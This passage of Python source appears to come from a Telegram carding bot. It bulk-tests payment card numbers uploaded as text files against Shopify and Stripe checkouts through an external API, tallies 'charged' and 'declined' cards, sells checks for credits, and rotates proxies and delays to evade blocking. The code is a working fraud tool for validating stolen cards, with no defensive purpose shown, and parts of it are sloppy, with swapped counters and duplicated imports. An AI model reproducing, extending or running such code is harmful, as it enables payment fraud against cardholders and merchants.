                if "actionrequiredreceipt" in final_text():
                    DS += 1
                    CHECKED += 1

                if "CHARGED" in result.get('status', '') or "ORDER_PLACED" in response_msg:
                    CHARGED += 1
                    successful += 1
                    CHECKED += 1
                elif "DECLINED" in result.get('status', ''):
                    DECLINED += 1
                    declined += 1
                    CHECKED += 1
                else:
                    DECLINED += 1
                    declined += 1
                    CHECKED += 1

            bin_info = get_bin_info(result.get('bin', ''))
            safe_card = card_to_display.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"𝘾𝙖𝙧𝙙 ☛ `{safe_card}`\n𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ☛ *{response_msg}*\n\n☣ 𝘽𝙞𝙣 ☛ {result.get('bin')}\n☢ 𝙄𝙣𝙛𝙤 ☛ {bin_info.get('scheme','')} - {bin_info.get('type','')} - PERSONAL\n☱ 𝘽𝙖𝙣𝙠 ☛ {bin_info.get('bank','')}\n[ϟ] Country: {bin_info.get('country','')} - [{bin_info.get('emoji','')}]\n\n━━━━━━━━━━━━━\n\n⛏ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 ☛ @{username} [ 💎 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ]\n☕ 𝘿𝙚𝙫 ∝ {result.get('dev','')} - {result.get('dev_emoji','')}" 

        except Exception as e:
            logger.exception(f"Error processing card {card_details}: {e}")
            safe_card = card_details.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"Card: `{safe_card}`\nResponse: *Processing Error ❗️*"
            ERROR += 1
            errors += 1

        try:
            await context.bot.send_message(chat_id=msg.chat.id, text=result_text, parse_mode='HTML')
        except Exception as e:
            logger.warning(f"Failed to send per-card message: {e}")

        if (i % 5 == 0) or (i == total_cards - 1):
            elapsed = time.time() - bulk_start_time
            avg_time = (elapsed / (i+1)) if (i+1) else 0.0
            try:
                await context.bot.edit_message_text(
                    chat_id=progress_message.chat.id,
                    message_id=progress_message.message_id,
                    text=(
                        f"Running... {i+1}/{total_cards}\n"
                        f"Charged: {CHARGED} | Declined: {DECLINED} | Errors: {ERROR}\n"
                        f"Elapsed: {elapsed:.2f}s | Avg: {avg_time:.2f}s"
                    )
                )
            except Exception as e:
                logger.warning(f"Failed to edit progress message: {e}")
                await asyncio.sleep(0.5)

    # Ensure bulk_start_time is defined
    if 'bulk_start_time' not in locals():
        bulk_start_time = time.time()
    
    total_time = time.time() - bulk_start_time
    avg_time = total_time / total_cards if total_cards else 0.0
    remaining_credits = get_user_credits(user_id)

    status_title = "✅ **Check Completed!**" if not STOP_CHECKING else "🛑 **Check Stopped!**"
    completion_msg = f"""{status_title}
━━━━━━━━━━━━━
 𝙎????𝙩𝙞𝙨𝙩𝙞𝙘𝙨 ⭚\n
• 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 ⭆ {CHECKED}/{total_cards}\n
• 𝙘𝙝𝙖𝙧𝙜𝙚𝙙 ⭆ {successful} 🔥\n
• 𝙙𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ⭆ {declined} ❌\n
• 𝙚𝙧𝙧𝙤𝙧𝙨 ⭆ {errors} ⚠️\n

<blockquote> 𝙏𝙞𝙢𝙞𝙣𝙜 ⭚\n
• 𝙏𝙤𝙩𝙖𝙡 ??𝙞𝙢𝙚 ⭆ {total_time:.2f}s\n
• 𝘼𝙫𝙜 𝙏𝙞𝙢𝙚 ⭆ {avg_time:.2f}s\n
• 𝙎𝙥𝙚𝙚𝙙 ⭆ { (CHECKED/total_time*60) if total_time>0 else 0:.1f} cards/min\n </blockquote>

 𝘾𝙧𝙚𝙙𝙞𝙩𝙨⭚\n
• 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 ⭆ {remaining_credits}
"""

    if proxy_info:
        completion_msg += f"\n{proxy_info}"

    completion_msg += "\n━━━━━━━━━━━━━\n🖥 𝘿𝙚𝙫 ⭞ 𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽"

    await context.bot.send_message(chat_id=msg.chat.id, text=completion_msg, parse_mode='HTML')

    STOP_CHECKING = False  # Reset after completion/stop

# ---------------- /stop command for bulk checks ----------------
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STOP_CHECKING
    STOP_CHECKING = True
    await update.effective_message.reply_text("𝙘𝙝𝙚𝙘𝙠 𝙬𝙞𝙡𝙡 𝙨𝙩𝙤𝙥 𝙖𝙛𝙩𝙚𝙧 𝙩𝙝𝙞𝙨 𝙘𝙖𝙧𝙙.......")
    
# ---------------- Progress updater ----------------
# ---------------- Document upload (txt) ----------------
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, _ = get_msg_user_info(update)
    doc = msg.document
    query = update.callback_query

    # Handle query safely
    if query:
        await query.answer()
        user = query.from_user
        chat = query.message.chat
    else:
        user = msg.from_user
        chat = msg.chat

    db = await load_user_db()
    if str(user.id) not in db:
        if query:
            await query.edit_message_text("You need to register first using /register.")
        else:
            await msg.reply_text("You need to register first using /register.")
        return

    # in groups, mass checks disabled
    if chat.type != "private":
        if query:
            await query.edit_message_text("Mass checks disabled in groups. Use single-card commands instead.")
        else:
            await msg.reply_text("Mass checks disabled in groups. Use single-card commands instead.")
        return

    if not doc:
        await msg.reply_text("𝙉𝙊 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙁𝙤𝙪𝙣𝙙")
        return

    # process document here
    # ...

    if not doc.file_name.lower().endswith('.txt'):
        await msg.reply_text("𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙞𝙡𝙚 𝙩𝙮𝙥𝙚!! 𝙪𝙥𝙡𝙤𝙖𝙙 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚")
        return

    try:
        file = await context.bot.get_file(doc.file_id)
        data = await file.download_as_bytearray()
        file_content = data.decode('utf-8', errors='ignore')
        cards = [line.strip() for line in file_content.splitlines() if line.strip()]
        username = msg.from_user.username or "USER"

        # Pass file_name to process_card_list for progress
        asyncio.create_task(process_card_list(update, context, cards, username, file_name=doc.file_name))
    except Exception as e:
        logger.exception(f"Error handling document: {e}")
        await msg.reply_text("An error occurred while processing the file.")

# ---------------- Progress updater ----------------
async def update_progress_message(bot, chat_id, message_id, start_time, file_name):
    global CHECKED, TOTAL, CHARGED, DECLINED, ERROR, STOP_CHECKING, ANIMATION_FRAMES, LOCK, PROXIES
    while not STOP_CHECKING:
        await asyncio.sleep(3)
        with LOCK:
            checked = CHECKED
            total = TOTAL
            charged = CHARGED
            dead = DECLINED
            error = ERROR
            ds = DS
        if total == 0:
            break
        percent = (checked / total * 100) if total else 0.0
        bar_len = 20
        filled = int(bar_len * (checked / total)) if total else 0
        bar = "█" * filled + "░" * (bar_len - filled)
        frame = ANIMATION_FRAMES[int(time.time() * 2) % len(ANIMATION_FRAMES)] if ANIMATION_FRAMES else ''
        elapsed = time.time() - start_time
        cpm = (checked / elapsed * 60) if elapsed > 0 else 0.0
        avg_time = (elapsed / checked) if checked else 0.0
        # Use HTMLV2 and escape special characters
        from telegram.helpers import escape_HTML  # Correct import for v20+
        text = escape_HTML(
            f"𝘼𝙐𝙏𝙊⤚𝙨𝙝𝙤𝙥𝙞𝙛𝙮\n"
            f"𝙎𝙏𝘼𝙏𝙐𝙎 ⤏ 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 {frame}\n\n"
            "━━━━━━━━━𝙎𝙏𝘼𝙏𝙎━━━━━━━━━\n"
            f"𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ⭆ {checked}/{total} [{bar}] {percent:.1f}%\n\n"
            f"𝘾𝙝𝙖𝙧𝙜𝙚𝙙 ⭆ {charged}\n\n"
            f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ⭆ {error}\n\n"
            f"3𝘿𝙎 ⭆ {ds}\n\n"
            f"𝙀𝙧𝙧𝙤𝙧 ⭆ {dead}\n"
            "━━━━━━━━━𝙋𝙚𝙧𝙛𝙤𝙧𝙢𝙖𝙣𝙘𝙚━━━━━━━━━\n"
            f"⚡ 𝘾𝙋𝙈 ⭆ {cpm:.1f} cards/min\n"
            f"⏱️ 𝘼𝙫𝙜 𝙏𝙞𝙢𝙚 ⭆ {avg_time:.2f}s\n"
            "━━━━━━━━━𝙎𝙄𝙏𝙀 ⭟ 𝙨𝙝𝙤𝙥𝙞𝙛𝙮 ━━━━━━━━━\n"
            f"🌐 𝙐𝙨𝙖𝙗𝙡𝙚 𝙋𝙧𝙤𝙭𝙮 ⭆ {len(PROXIES) if PROXIES else 0}\n"
            f"🚫 𝘽𝙖𝙣𝙣𝙚𝙙 ⭆ 𝙉𝙤𝙣𝙚\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📄 File: {os.path.basename(file_name)}\n"
            f"👤 By: {chat_id}\n"  # Note: Changed to chat_id, but if you have username, use it
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "𝙐𝙎𝙀 /stop 𝙏𝙤 𝙎𝙩𝙤𝙥",
            version=2
        )
        try:
            await bot.edit_message_text(text=text, chat_id=chat_id, message_id=message_id, parse_mode="HTMLV2")
        except Exception as e:
            logger.warning(f"Failed to update progress message: {e}")
        if checked >= total:
            break

# ---------------- /msh mass-check command ----------------
async def msh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, _ = get_msg_user_info(update)

    query = update.callback_query
    
    if query:
        await query.answer()
        user = query.from_user
        chat = query.message.chat
    else:
        user = msg.from_user
        chat = msg.chat

    db = await load_user_db()
    if str(user.id) not in db:
        if query:
            await query.edit_message_text("You need to register first using /register.")
        else:
            await msg.reply_text("You need to register first using /register.")
        return

    # in groups, mass checks disabled
    

    if context.args:
        card_list_raw = " ".join(context.args)
    else:
        full = msg.text or ""
        parts = full.split(maxsplit=1)
        card_list_raw = parts[1] if len(parts) >= 2 else ""

    if not card_list_raw:
        await msg.reply_text("𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙤𝙧𝙢𝙖𝙩𝙩 𝙪𝙨𝙚 /𝙢𝙨𝙝 <𝙘𝙖𝙧𝙙> \n <𝙘𝙖𝙧𝙙> \n <𝙘𝙖𝙧𝙙>")
        return

    cards = [card.strip() for card in re.split(r'[\n\s]+', card_list_raw) if card.strip()]
    username = msg.from_user.username or "USER"

    # For inline /msh, use a placeholder file_name
    asyncio.create_task(process_card_list(update, context, cards, username, file_name="inline_cards.txt"))

# ---------------- Mass-check helpers (process_card_list) ----------------
# Updated to accept optional file_name and start progress updater
async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, username: str, file_name: str = "cards.txt"):
    msg, user, user_id, username = get_msg_user_info(update)

    if not username:
        username = "USER"
    user_id = update.effective_user.id
    start_process_for_user(user_id)
    await update.message.reply_text("5 Workers Started")    

    if not cards:
        await msg.reply_text("𝙉𝙊 𝙫𝙖𝙡𝙞𝙙 𝘾𝙖𝙧𝙙𝙨 𝙁𝙤𝙪𝙣𝙙 ᚏ 𝙤𝙣𝙚 𝙘𝙖𝙧𝙙 𝙥𝙚𝙧 𝙡𝙞𝙣𝙚 𝙤𝙣𝙡𝙮")
        return

    total_cards = len(cards)
    if total_cards > 1000:
        await msg.reply_text(f"𝙏𝙊𝙊 𝙢𝙖𝙣𝙮 𝙘𝙖𝙧𝙙𝙨. 𝙊𝙣𝙡𝙮 1000 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 ????  {total_cards}.")
        return

    credits = get_user_credits(user_id)
    if credits < total_cards:
        await msg.reply_text(f"❌ 𝙄𝙣𝙨𝙪𝙛𝙛. 𝘾𝙧𝙚𝙙𝙞𝙩𝙨. 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 {credits} 𝙘𝙧𝙚𝙙𝙞𝙩𝙨. {total_cards} 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙")
        return

    bulk_start_time = time.time()

    proxy_info = ""
    if proxy_list:
        proxy = get_random_proxy()
        if proxy:
            proxy_host = proxy['http'].split('@')[-1]
            is_working, proxy_ms = await asyncio.to_thread(test_proxy, proxy)
            if is_working:
                proxy_info = f"🔒 𝙥𝙧𝙤𝙭𝙮 ⭆: `{proxy_host}` ({proxy_ms}ms)"
            else:
                proxy_info = f"𝙋𝙧𝙤𝙭𝙮 ⭆ `{proxy_host}` (𝙉𝙤𝙣 𝙍𝙚𝙨𝙥𝙤𝙣𝙙𝙞𝙣𝙜)"

    start_msg = f"{total_cards} 𝙘𝙖𝙧𝙙𝙨 𝙧𝙚𝙘𝙞𝙚𝙫𝙚𝙙. 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙡𝙡 𝙨𝙤𝙤𝙣 𝙖𝙥𝙥𝙚𝙖𝙧. 𝙎𝙏𝘼𝙔 𝙏𝙐𝙉𝙀𝘿 ♞"
    if proxy_info:
        start_msg += f"\n{proxy_info}"

    await msg.reply_text(start_msg, parse_mode='HTML')

    global CHECKED, TOTAL, CHARGED, ERROR, DECLINED, STOP_CHECKING
    TOTAL = total_cards
    CHECKED = CHARGED = DECLINED = ERROR = 0  # Reset globals if needed
    STOP_CHECKING = False  # Ensure reset at start

    # Send initial progress message and start updater task
    progress_message = await msg.reply_text("𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝙃𝙖𝙧𝙙 ♨")
    asyncio.create_task(update_progress_message(context.bot, msg.chat.id, progress_message.message_id, bulk_start_time, file_name))

    successful = 0
    declined = 0
    errors = 0

    for i, card_details in enumerate(cards):
        if STOP_CHECKING:
            break  # Stop if /stop was called

        try:
            deduct_credit(user_id)
        except Exception as e:
            logger.warning(f"deduct_credit failed for {user_id}: {e}")

        if i > 0:
            if asyncio.iscoroutinefunction(random_delay):
                await random_delay(1, 2)
            else:
                await asyncio.to_thread(random_delay, 1, 2)

        result_text = ""
        try:
            # call sh_check – handle async/sync
            if asyncio.iscoroutinefunction(sh_check):
                result = await sh_check(card_details, username)
            else:
                result = await asyncio.to_thread(sh_check, card_details, username)

            if isinstance(result, str):
                card_to_display = card_details
                response_msg = f"Error: {result}"
                errors += 1
            else:
                card_to_display = result.get('full_card', card_details)
                response_msg = result.get('resp_msg', '')

                if "CHARGED" in result.get('status', '') or "ORDER_PLACED" in response_msg:
                    CHARGED += 1
                    successful += 1
                    CHECKED += 1
                elif "DECLINED" in result.get('status', ''):
                    DECLINED += 1
                    declined += 1
                    CHECKED += 1
                else:
                    ERROR += 1
                    errors += 1
                    CHECKED += 1

            safe_card = card_to_display.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"Card: `{safe_card}`\nResponse: *{response_msg}*"

        except Exception as e:
            logger.exception(f"Error processing card {card_details}: {e}")
            safe_card = card_details.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"Card: `{safe_card}`\nResponse: *Processing Error ❗️*"
            ERROR += 1
            errors += 1

        try:
            await context.bot.send_message(chat_id=msg.chat.id, text=result_text, parse_mode='HTML')
        except Exception as e:
            logger.warning(f"Failed to send per-card message: {e}")

        # No manual edit here - updater task handles it every 3s

    total_time = time.time() - bulk_start_time
    avg_time = total_time / total_cards if total_cards else 0.0
    remaining_credits = get_user_credits(user_id)

    status_title = "𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 ⎈" if not STOP_CHECKING else "𝙁𝙞𝙧𝙚 𝙀𝙨𝙩𝙞𝙣𝙦𝙪𝙞𝙨𝙝𝙚𝙙 ↺"
    completion_msg = f"""{status_title}
━━━━━━━━━━━━━
𝙎𝙏𝘼𝙏𝙎 ⭚\n
• 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 ⭆ {CHECKED}/{total_cards}\n\n
• 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 ⭆ {successful} 🔥\n\n
• 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ⭆ {errors} ❌\n\n
• 𝙀𝙧𝙧𝙤𝙧𝙨 ⭆ {declined}\n\n

⏱️ 𝙏𝙞𝙢𝙞𝙣𝙜 ⭛
• 𝙏𝙤𝙩𝙖𝙡 𝙏𝙞𝙢𝙚 ⭆ {total_time:.2f}s
• 𝘼𝙫𝙜 𝙏𝙞𝙢𝙚 ⭆ {avg_time:.2f}s
• 𝙎𝙥𝙚𝙚𝙙 ⭆ { (CHECKED/total_time*60) if total_time>0 else 0:.1f} 𝙘𝙖𝙧𝙙𝙨/𝙢𝙞𝙣

💳 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ⭝
• 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 ⭆ {remaining_credits}
"""

    if proxy_info:
        completion_msg += f"\n{proxy_info}"

    completion_msg += "\n━━━━━━━━━━━━━\nᓀ ᓂ 𝘿𝙚𝙫 ⭆ 𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽 ☢"

    await context.bot.send_message(chat_id=msg.chat.id, text=completion_msg, parse_mode='HTML')

    STOP_CHECKING = True  # Signal updater to stop (it checks this)
    await asyncio.sleep(1)  # Give updater time to notice
    STOP_CHECKING = False  # Reset for next run

# ---------------- Proxy utilities & commands ----------------
async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global proxy_list
    msg, _, _, _ = get_msg_user_info(update)
    if not context.args:
        await msg.reply_text("𝙀𝙣𝙩𝙚𝙧 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙬𝙞𝙩𝙝 𝙞𝙩 ❌\n𝙐𝙨𝙖𝙜𝙚 ⤍ `/addproxy ip:port:user:pass`", parse_mode='HTML')
        return

    proxy_string = " ".join(context.args).strip()
    parts = proxy_string.split(':')
    if len(parts) != 4:
        await msg.reply_text("𝙁𝙤𝙧𝙢𝙖𝙩𝙩 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 \n 𝙐𝙨𝙚 𝙧𝙤𝙩𝙖𝙩𝙞𝙣𝙜 𝙥𝙧𝙤𝙭𝙮 𝙛𝙧𝙤𝙢 𝙒𝙚𝙗𝙨𝙝𝙖𝙧𝙚.𝙞𝙤 ❌\n𝙐𝙨𝙚 ⤍ `/addproxy ip:port:user:pass`", parse_mode='HTML')
        return

    ip, port, user, password = parts
    proxy_url = f"http://{user}:{password}@{ip}:{port}"
    new_proxy = {"http": proxy_url, "https": proxy_url}
    testing_msg = await msg.reply_text(f"🔍 Testing proxy: `{ip}:{port}`\nPlease wait...", parse_mode='HTML')

    is_working, response_time = await asyncio.to_thread(test_proxy, new_proxy)

    if is_working:
        proxy_list.append(new_proxy)
        try:
            await context.bot.edit_message_text(
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                text=(
                    f"𝘼𝙙𝙙𝙚𝙙 𝙉𝙚𝙬 𝙋𝙧𝙤𝙭𝙮 ⍈\n\n"
                    f"📍 𝙋𝙧𝙤𝙭𝙮 ⭆ `{ip}:{port}`\n"
                    f"𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 𝙩𝙞𝙢𝙚 ⭆ `{response_time}ms`\n"
                    f"𝙏𝙤𝙩𝙖𝙡 𝙋𝙧𝙤𝙭𝙮 ⭆ `{len(proxy_list)}`"
                ),
                parse_mode='HTML'
            )
        except Exception as e:
            logger.warning(f"Failed to edit testing message in add_proxy: {e}")
    else:
        try:
            await context.bot.edit_message_text(
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                text=(
                    f"𝙋𝙧𝙤𝙭𝙮 𝙏𝙚𝙨𝙩 𝙁𝙖𝙞𝙡𝙚𝙙 ⭖\n\n"
                    f"📍 𝙋𝙧𝙤𝙭𝙮 ⭆ `{ip}:{port}`\n\n"
                    f"𝙎𝙩𝙖𝙩𝙪𝙨 ⭙ 𝙉𝙤𝙩 𝙒𝙤𝙧𝙠𝙞𝙣𝙜/𝙏𝙞𝙢𝙚𝙤𝙪𝙩\n\n"
                    f"💡 𝙂𝙚𝙩 𝙍𝙤𝙩𝙖𝙩𝙞𝙣𝙜 𝙋𝙧𝙤𝙭𝙮 𝙁𝙧𝙤𝙢 𝙒𝙚𝙗𝙨𝙝𝙖𝙧𝙚.𝙞𝙤"
                ),
                parse_mode='HTML'
            )
        except Exception as e:
            logger.warning(f"Failed to edit testing message in add_proxy (fail): {e}")

async def remove_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global proxy_list
    msg, _, _, _ = get_msg_user_info(update)
    proxy_list.clear()
    await msg.reply_text("𝙍𝙚𝙢𝙤𝙫𝙚𝙙 𝙖𝙡𝙡 𝙋𝙧𝙤𝙭𝙞𝙚𝙨 ⨷")

async def my_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, _ = get_msg_user_info(update)
    if proxy_list:
        testing_msg = await msg.reply_text("🔍 𝙏𝙚𝙨𝙩𝙞𝙣𝙜 𝙖𝙡𝙡 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 \n𝙒𝙖𝙞𝙩..........⨰")
        proxy_status = []
        for idx, proxy in enumerate(proxy_list, 1):
            host = proxy['http'].split('@')[-1]
            is_working, response_time = await asyncio.to_thread(test_proxy, proxy)
            if is_working:
                status = f"{idx}. `{host}` - ✅ {response_time}ms"
            else:
                status = f"{idx}. `{host}` - ❌ 𝙉𝙤𝙩 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ⨴⨵"
            proxy_status.append(status)

        proxy_info = "\n".join(proxy_status)
        try:
            await context.bot.edit_message_text(
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                text=f"𝘾𝙪𝙧𝙧𝙚𝙣𝙩 𝙋𝙧𝙤𝙭𝙞𝙚𝙨 ⭆ ({len(proxy_list)})**\n\n{proxy_info}",
                parse_mode='HTML'
            )
        except Exception as e:
            logger.warning(f"𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙚𝙙𝙞𝙩 𝙥𝙧𝙤𝙭𝙮 {e}")
    else:
        await msg.reply_text("𝙉𝙤 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙨𝙚𝙩 \n 𝙂𝙚𝙩 𝙧𝙤𝙩𝙖𝙩𝙞𝙣𝙜 𝙥𝙧𝙤𝙭𝙮 𝙛𝙧𝙤𝙢 𝙒𝙚𝙗𝙨𝙝𝙖𝙧𝙚.𝙞𝙤")
import asyncio
import time
import logging
import re
import os
import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

# Assume globals and helpers like before: add_user, get_user_credits, deduct_credit, random_delay, etc.
# Assume sh_check exists, but we're adding st_check

def st_check(card_details, username):
    """Blocking function to check card via Stripe API."""
    url = f"https://rzp-production-2493.up.railway.app/stripe_01?auth=technopile&cc={card_details}"
    try:
        response = requests.get(url, timeout=15)  # Slightly longer timeout for reliability
        response.raise_for_status()
        result_text = response.text.strip()
        
        
        # Assume API returns simple text like "Charged", "Declined", "Error: Insufficient funds", etc.
        # Adapt based on actual response; for now, parse as status
        if "charged" in result_text.lower() or "success" in result_text.lower():
            status = "Charged 💳"
            resp_msg = result_text or "Order placed successfully"
        elif "declined" in result_text.lower():
            status = "Declined ❌"
            resp_msg = result_text or "Card declined"
        else:
            status = "Error ⚠️"
            resp_msg = result_text or "Unknown response"
        
        # Fake bin_info for formatting (replace with real BIN lookup if needed)
        bin_info = {
            'scheme': 'Visa',  # Example
            'type': 'Credit',
            'bank': 'Unknown',
            'country': 'US',
            'emoji': '🇺🇸'
        }
        bin_val = card_details.split('|')[0][:6]
        
        elapsed = int(response.elapsed.total_seconds() * 1000)
        
        return {
            'status': status,
            'resp_msg': resp_msg,
            'full_card': card_details,
            'bin': bin_val,
            'bin_info': bin_info,
            'elapsed_time': f"{elapsed}ms",
            'dev': 'Stripe Checker',
            'dev_emoji': '🔵'
        }
    except requests.exceptions.RequestException as e:
        logger.error(f"API request failed for {card_details}: ")
        return f"API Error"

# Helper to get message/user info (assume exists, or define)
def get_msg_user_info(update: Update):
    msg = update.effective_message
    user = update.effective_user
    user_id = user.id if user else None
    username = user.username or "USER"
    return msg, user, user_id, username

# ---------------- /st single check ----------------
async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, user_id, username = get_msg_user_info(update)
    
    # Parse card from args or message
    card_details = None
    if context.args:
        card_details = " ".join(context.args).strip()
    else:
        full_text = msg.text.strip() if msg.text else ""
        parts = full_text.split(maxsplit=1)
        if len(parts) >= 2:
            card_details = parts[1].strip()
    
    if not card_details or '|' not in card_details:
        await msg.reply_text("❌ Invalid format. Use: /st cardnumber|mm|yyyy|cvv\nExample: /st 4147768578745265|04|2026|168")
        return
    
    # Add user and check credits
    try:
        add_user(user_id, username)
        credits = get_user_credits(user_id)
        if credits < 1:
            await msg.reply_text("❌ Insufficient credits! Need 1 credit. Use /redeem <code>.")
            return
        deduct_credit(user_id)
    except Exception as e:
        logger.warning(f"User/credits error: {e}")
        await msg.reply_text("❌ Error with account. Try /start.")
        return
    
    # Send waiting message
    waiting_msg = await msg.reply_text("⏳ Checking card via Stripe... (slow for accuracy)")
    
    # Run check in thread (since st_check is sync/blocking)
    try:
        result = await asyncio.to_thread(st_check, card_details, username)
    except Exception as e:
        logger.exception(f"st_check error: {e}")
        await waiting_msg.edit_text(f"❌ Check failed: {e}")
        return
    
    # Format response (similar to sh)
    if isinstance(result, str):
        response_text = f"❌ Error: {result}"
    else:
        status_emoji = result.get('status', 'Unknown')
        resp_format = f"*{result.get('resp_msg', '')}*"
        remaining_credits = get_user_credits(user_id)
        
        response_text = f"""#Stripe_Check | BOT [/st]
━━━━━━━━━━━━━
[💳] Card: `{result.get('full_card', card_details)}`
[🔵] Gateway: Stripe API
[📊] Status: {status_emoji}
[📝] Response: {resp_format}
━━━━━━━━━━━━━
[🔢] Bin: {result.get('bin', 'N/A')}
[🏦] Info: {result.get('bin_info', {}).get('scheme', 'N/A')} - {result.get('bin_info', {}).get('type', 'N/A')} - PERSONAL
[🏛️] Bank: {result.get('bin_info', {}).get('bank', 'N/A')}
[🌍] Country: {result.get('bin_info', {}).get('country', 'N/A')} [{result.get('bin_info', {}).get('emoji', 'N/A')}]
━━━━━━━━━━━━━
[👤] Checked By: @{username}
[🔧] Dev: {result.get('dev', 'Unknown')} {result.get('dev_emoji', '')}
━━━━━━━━━━━━━
[⏱️] Time: {result.get('elapsed_time', 'N/A')} | Credits Left: {remaining_credits}"""
    
    # Edit waiting message
    try:
        await waiting_msg.edit_text(response_text, parse_mode='HTML')
    except Exception as e:
        logger.warning(f"Edit failed: {e}")
        await msg.reply_text(response_text, parse_mode='HTML')

# ---------------- Mass check globals (for progress) ----------------
CHECKED_ST = 0
TOTAL_ST = 0
CHARGED_ST = 0
DECLINED_ST = 0
ERROR_ST = 0
STOP_MASS = False

# ---------------- process_mass_st ----------------
async def process_mass_st(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, username: str, file_name: str = "cards.txt"):
    global CHECKED_ST, TOTAL_ST, CHARGED_ST, DECLINED_ST, ERROR_ST, STOP_MASS
    msg, _, user_id, username = get_msg_user_info(update)
    
    if not cards:
        await msg.reply_text("❌ No valid cards found.")
        return
    
    total_cards = len(cards)
    if total_cards > 200:  # Limit to avoid overload
        await msg.reply_text(f"❌ Too many cards (max 200). Provided: {total_cards}")
        return
    
    credits = get_user_credits(user_id)
    if credits < total_cards:
        await msg.reply_text(f"❌ Need {total_cards} credits. You have {credits}.")
        return
    
    # Reset globals
    TOTAL_ST = total_cards
    CHECKED_ST = CHARGED_ST = DECLINED_ST = ERROR_ST = 0
    STOP_MASS = False
    
    await msg.reply_text(f"🚀 Starting slow Stripe mass check ({total_cards} cards). Will take time to avoid blocks.")
    
    progress_msg = await msg.reply_text("Progress: 0/{} | Charged: 0 | Declined: 0 | Errors: 0".format(total_cards))
    
    successful = 0
    declined = 0
    errors = 0
    start_time = time.time()
    
    for i, card_details in enumerate(cards):
        if STOP_MASS:
            await msg.reply_text("🛑 Mass check stopped.")
            break
        
        # Deduct credit
        try:
            deduct_credit(user_id)
        except:
            pass  # Already checked total
        
        # Slow delay (3-5s between checks to avoid any potential blocks)
        if i > 0:
            delay = random.uniform(3, 5)
            await asyncio.sleep(delay)
            logger.info(f"Delay: {delay:.2f}s before card {i+1}")
        
        # Check card
        try:
            result = await asyncio.to_thread(st_check, card_details, username)
            
            if isinstance(result, str):
                response_msg = f"Error: {result}"
                errors += 1
                ERROR_ST += 1
            else:
                response_msg = result.get('resp_msg', '')
                status = result.get('status', '')
                if "Charged" in status:
                    CHARGED_ST += 1
                    successful += 1
                elif "Declined" in status:
                    DECLINED_ST += 1
                    declined += 1
                else:
                    ERROR_ST += 1
                    errors += 1
                CHECKED_ST += 1
                response_msg = f"Status: {status} | {response_msg}"
            
            # Send per-card result (short to avoid spam)
            safe_card = card_details.replace('|', ' | ')
            await msg.reply_text(f"Card {i+1}: `{safe_card}`\n{response_msg}", parse_mode='HTML')
            
        except Exception as e:
            logger.exception(f"Mass check error for {card_details}: {e}")
            await msg.reply_text(f"Card {i+1}: `{card_details.replace('|', ' | ')}` | Processing Error")
            errors += 1
            ERROR_ST += 1
            CHECKED_ST += 1
        
        # Update progress every card (slow anyway, no rate issue)
        elapsed = time.time() - start_time
        avg_time = elapsed / CHECKED_ST if CHECKED_ST else 0
        try:
            await progress_msg.edit_text(
